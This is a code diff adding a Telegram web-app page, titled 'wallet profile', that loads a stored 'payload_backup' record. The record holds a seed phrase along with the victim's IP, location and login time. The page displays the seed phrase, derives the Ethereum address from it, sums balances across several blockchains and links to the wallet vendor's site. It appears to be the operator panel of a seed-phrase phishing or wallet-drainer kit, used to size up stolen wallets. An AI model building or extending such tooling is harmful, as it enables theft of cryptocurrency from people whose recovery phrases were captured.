@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Профиль кошелька</title>
+    <link rel="stylesheet" href="/webapp/style.css" />
+    <link rel="stylesheet" href="/webapp/profile.css" />
+    <script src="https://telegram.org/js/telegram-web-app.js"></script> <!-- ✅ обовʼязково -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>👛 Профиль кошелька</h1>
+        <p><strong>ETH адрес:</strong> <span id="walletAddress">–</span></p>
+        <p><strong>Дата входа:</strong> <span id="timestamp">–</span></p>
+        <p><strong>IP:</strong> <span id="userIp">–</span></p>
+        <p><strong>Локация:</strong> <span id="userLocation">–</span></p>
+        <p><strong>Общий баланс:</strong> <span id="walletBalance">⏳ Загрузка…</span></p>
+        <p><strong>Seed-фраза:</strong></p>
+        <textarea id="seed" readonly style="width:100%;height:100px;"></textarea>
+        <button id="goWalletBtn">🔁 Перейти в кошелёк</button>
+    </div>
+
+    <script>
+        const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
+        const seedPhrase = (data.seed || "").trim();
+        const walletType = (data.wallet || "").toLowerCase();
+        const timestamp = data.timestamp || "–";
+        const ip = data.ip || "–";
+        const userLocation = data.location || "–";
+
+        document.getElementById("timestamp").textContent = timestamp;
+        document.getElementById("userIp").textContent = ip;
+        document.getElementById("userLocation").textContent = userLocation;
+        document.getElementById("seed").textContent = seedPhrase;
+
+        const addressSpan = document.getElementById("walletAddress");
+        const balanceSpan = document.getElementById("walletBalance");
+
+        let ethAddress = null;
+        try {
+            const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+            ethAddress = wallet.address;
+            addressSpan.textContent = ethAddress;
+        } catch (e) {
+            addressSpan.textContent = "Ошибка seed-фразы";
+            console.error("❌ Invalid seed:", e);
+        }
+
+        const supported = [
+            { coin: "ethereum", symbol: "ETH", chain: "ethereum" },
+            { coin: "bitcoin", symbol: "BTC", chain: "bitcoin" },
+            { coin: "binancecoin", symbol: "BNB", chain: "bsc" },
+            { coin: "solana", symbol: "SOL", chain: "solana" },
+            { coin: "matic-network", symbol: "MATIC", chain: "polygon" },
+            { coin: "tron", symbol: "TRX", chain: "tron" },
+            { coin: "cardano", symbol: "ADA", chain: "cardano" },
+            { coin: "polkadot", symbol: "DOT", chain: "polkadot" }
+        ];
+
+        async function fetchPrices() {
+            const ids = supported.map(c => c.coin).join(",");
+            const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`;
+            const res = await fetch(url);
+            return await res.json();
+        }
+
+        async function fetchBalance(chain, address) {
+            try {
+                switch (chain) {
+                    case "ethereum":
+                        return fetch(`https://api.blockchair.com/ethereum/dashboards/address/${address}`)
+                            .then(r => r.json())
+                            .then(d => parseFloat(d.data[address.toLowerCase()].address.balance) / 1e18);
+                    case "bitcoin":
+                        return fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`)
+                            .then(r => r.text())
+                            .then(sats => parseFloat(sats) / 1e8);
+                    case "bsc":
+                        return fetch(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=YourApiKeyToken`)
+                            .then(r => r.json())
+                            .then(d => parseFloat(d.result) / 1e18);
+                    case "solana":
+                        return fetch("https://api.mainnet-beta.solana.com", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                jsonrpc: "2.0",
+                                id: 1,
+                                method: "getBalance",
+                                params: [address]
+                            })
+                        }).then(r => r.json()).then(d => parseFloat(d.result.value) / 1e9);
+                    case "polygon":
+                        return fetch(`https://api.polygonscan.com/api?module=account&action=balance&address=${address}&apikey=YourApiKeyToken`)
+                            .then(r => r.json())
+                            .then(d => parseFloat(d.result) / 1e18);
+                    case "tron":
+                        return fetch(`https://api.trongrid.io/v1/accounts/${address}`)
+                            .then(r => r.json())
+                            .then(d => parseFloat(d.data?.[0]?.balance || 0) / 1e6);
+                    case "cardano":
+                    case "polkadot":
+                        return 0;
+                }
+            } catch (e) {
+                console.warn(`❌ Balance fetch error for ${chain}:`, e);
+                return 0;
+            }
+        }
+
+        async function calculateTotalETH() {
+            if (!ethAddress) {
+                balanceSpan.textContent = "Ошибка адреса";
+                return;
+            }
+
+            const prices = await fetchPrices();
+            let totalETH = 0;
+
+            await Promise.all(supported.map(async token => {
+                const balance = await fetchBalance(token.chain, ethAddress);
+                const rate = prices[token.coin]?.eth || 0;
+                totalETH += balance * rate;
+            }));
+
+            balanceSpan.textContent = `${totalETH.toFixed(6)} ETH`;
+        }
+
+        calculateTotalETH();
+
+        function goToWallet() {
+            let url = "https://www.google.com";
+
+            if (walletType.includes("metamask")) {
+                url = "https://metamask.io/";
+            } else if (walletType.includes("trust")) {
+                url = "https://trustwallet.com/";
+            } else if (walletType.includes("phantom")) {
+                url = "https://phantom.app/";
+            } else if (walletType.includes("ton")) {
+                url = "https://tonkeeper.com/";
+            } else if (walletType.includes("coinbase")) {
+                url = "https://www.coinbase.com/wallet";
+            }
+
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.openLink(url);  // Відкриває зовнішній браузер
+            } else {
+                window.open(url, "_blank");
+            }
+        }
+        document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
+    </script>
+</body>
+</html>
